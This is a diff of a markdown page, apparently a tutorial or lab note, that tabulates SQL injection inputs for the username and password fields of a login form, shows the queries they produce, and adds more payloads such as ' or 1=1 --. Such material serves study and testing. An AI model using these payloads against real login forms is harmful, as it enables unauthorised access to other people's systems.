@@ -17,3 +17,11 @@ Below is a few simple tests that we can do to attempt SQL injection on the **pas
 | ' or '1'='1	| ' or '1'='1	| SELECT * FROM users WHERE name='' or '1'='1' and password='' or '1'='1' |
 | ' or ' 1=1	| ' or ' 1=1	| SELECT * FROM users WHERE name='' or ' 1=1' and password='' or ' 1=1' |
 | 1' or 1=1 -- -	| blah	| SELECT * FROM users WHERE name='1' or 1=1 -- -' and password='blah' |
+
+## Other SQL Injection Techniques
+We can also try the following techniques to attempt SQL injection,
+
+| Username | Password |
+|----------|----------|
+| ' or 1=1 -- | blah | 
+| blah | ' or 1=1 -- | 
